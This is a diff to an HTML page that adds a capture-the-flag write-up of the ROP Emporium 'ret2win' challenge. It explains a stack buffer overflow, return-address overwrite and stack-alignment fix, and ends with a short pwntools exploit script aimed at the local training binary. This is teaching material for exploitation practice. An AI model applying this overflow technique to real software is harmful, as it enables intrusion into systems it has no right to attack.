@@ -1,14 +1,74 @@
 <div class="page-header">
     <div class="page-header-inner">
         <div class="page-header-inner2">
-            <h1>Rop-Emporium - Ret2win</h1>
+            <h1>Ret2Win Writeup</h1>
+            <h2>May 2021</h2>           
+            <h4>Return to win function</h4>
         </div>
     </div>
 </div>
+<H4>Problem</H4>
 <div class="paragraph">
-    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Distinctio excepturi asperiores voluptate quisquam! Temporibus minus esse obcaecati recusandae exercitationem quam adipisci laboriosam veniam, est molestiae reiciendis at, nobis autem soluta?</p>
+    <p>
+        ret2win means 'return here to win' and it's recommended you start with this challenge. </a> <a href=../../docs/rop_emporium/ret2win>ret2win</a>
+    	<br>
+    </p>
 </div>
+<H4>Solution</H4>
 <div class="paragraph">
-    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Laudantium inventore vel ut, a eum harum. Aliquam est hic maxime, temporibus neque minima optio, quia alias sequi non dolores distinctio dolore?</p>
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally.
+        <br>
+    	Running the binary, it prompts us with a message indicating that it will read in 56 bytes into a 32 byte buffer, which will cause a stack buffer overflow. The binary also appears to have a win function called ret2win, so in this case the exploit path is extremely simple, we overflow the buffer, and then redirect execution to the ret2win function by overwriting the return address to print out the flag. 
+    	<br><br>
+    </p>
 </div>
+<div>
+    <img src="../imgs/rop_emporium/ret2win1.png" alt="">
+</div>
+
+<div class="paragraph">
+    <p>
+        <br><br>
+        After completing the above steps and sending in a payload in the form of "padding + ret2win address", I encountered an issue. While I successfuly redirected execution to the win function, it still did not print out the flag. This is due to a little issue with system. For it to reliably execute, the stack needs to be aligned on a 16 bit boundary, otherwise the system call never successfuly executes. Once we make this small adjustment, we can run our exploit script and retrieve the flag. 
+        <br>
+        Our final exploit is posted below.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/rop_emporium/ret2win2.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./ret2win')
+libc = elf.libc
+
+p = elf.process()
+ret = p64(0x000000000040053e) 
+
+payload = b"A"*40 + ret + p64(elf.sym.ret2win)
+
+p.sendline(payload)
+log.info(p.clean())
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
